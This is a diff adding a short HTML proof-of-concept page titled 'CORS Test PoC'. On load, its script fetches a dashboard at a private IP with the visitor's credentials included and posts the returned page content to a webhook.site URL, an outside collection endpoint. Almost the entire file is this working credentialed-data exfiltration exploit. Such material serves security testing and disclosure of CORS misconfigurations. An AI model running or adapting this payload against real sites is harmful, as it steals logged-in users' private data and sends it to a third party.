@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>CORS Test PoC</h1>
+  <script>
+    fetch("https://192.168.80.142/dashboard/", {
+      method: "GET",
+      credentials: "include"
+    })
+    .then(res => res.text())
+    .then(data => {
+      fetch("https://webhook.site/d9a2e8f6-2700-4fe8-9224-1b93cbeb299b", {
+        method: "POST",
+        headers: {
+          "Content-Type": "text/plain"
+        },
+        body: data
+      });
+    });
+  </script>
+</body>
+</html>
